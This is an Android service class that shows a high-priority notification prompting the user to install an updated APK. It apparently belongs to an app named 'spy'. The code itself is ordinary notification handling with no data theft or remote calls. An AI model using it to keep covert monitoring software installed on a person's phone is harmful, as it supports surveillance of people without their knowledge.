package com.gameofcoding.spy.services;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.activities.AppUpdateInstallerActivity;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.XLog;

/**
 * Sends a notification to user for installing new version of application.
 * <b>NOTE: We don't need to stop this service because once the application gets updated, service
 * automatically gets stopped.</b>
 * <b>NOTE: Please provide the path to apk (update of current app) through intent.</b>
*/
public class AppUpdateInformerService extends Service {
    private static final String TAG = "AppUpdateInformerService";
    /**
     * App update Notification id
     */
    private final int APP_UPDATE_INFORMER_SERVICE_NOTIF_ID = 100;
    private Intent mIntent;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "AppUpdateInformerService started..");
	mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	// Load the passed apk path
        if(intent.getExtras() != null) {
            mIntent = intent;
	} else {
	    XLog.w(TAG, "No details provided about app update, aborting update...");
	    stopService();
	}

	// Show foreground notification
	XLog.v(TAG, "Sending notif for app update.");
	updateForegroundNotif();
        return START_STICKY;
    }

    /*
     * Shows foreground notification
     */
    @SuppressWarnings("deprecation")
    public void updateForegroundNotif() {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    // Create a  noticiation channel for android oreo and above
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createHighPriorityNotifChannel();
	    String channelID = notifUtils.getHighPriorityNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	    notifBuilder.setPriority(Notification.PRIORITY_HIGH);
	}

	// Intent to be fired on notification click;
	Intent intent = new Intent(mContext, AppUpdateInstallerActivity.class);
        intent.putExtras(mIntent);
	final PendingIntent pendingIntent = PendingIntent
	    .getActivity(mContext, -1, intent, PendingIntent.FLAG_UPDATE_CURRENT);

	// Show foreground notification
	notifBuilder
	    .setSmallIcon(R.drawable.ic_stat_cloud_done)
	    .setContentTitle(getString(R.string.app_update_informer_service_notif_content_title))
	    .setContentText(getString(R.string.app_update_informer_service_notif_content_text))
	    .setContentIntent(pendingIntent)
	    .setDefaults(Notification.DEFAULT_VIBRATE | Notification.DEFAULT_SOUND);
	startForeground(APP_UPDATE_INFORMER_SERVICE_NOTIF_ID, notifBuilder.build());
    }

    /*
     * Stops service
     */
    private void stopService() {
	stopSelf();
    }
}
